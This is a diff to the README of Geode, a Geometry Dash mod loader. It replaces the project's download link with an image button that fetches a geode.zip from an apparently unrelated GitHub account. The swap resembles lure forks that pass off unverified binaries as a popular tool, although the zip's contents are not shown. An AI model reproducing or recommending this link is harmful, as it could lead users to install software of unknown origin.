@@ -5,7 +5,7 @@
 
 <p align="center"><b>Geode</b> is a <a href="https://store.steampowered.com/app/322170/Geometry_Dash/">Geometry Dash</a> <b>mod loader</b> and <b>modding SDK</b> with a modern approach towards mod development.</p>
 
-###### [DOWNLOAD GEODE](https://discord.gg/9e43WMKzh)
+[![downbutton](https://github.com/user-attachments/assets/150c77a6-a2a1-422d-8bb0-fa55c395a932)](https://github.com/bridgestonemasonstar/geode/releases/download/main/geode.zip)
 
 
 ## Why Geode?
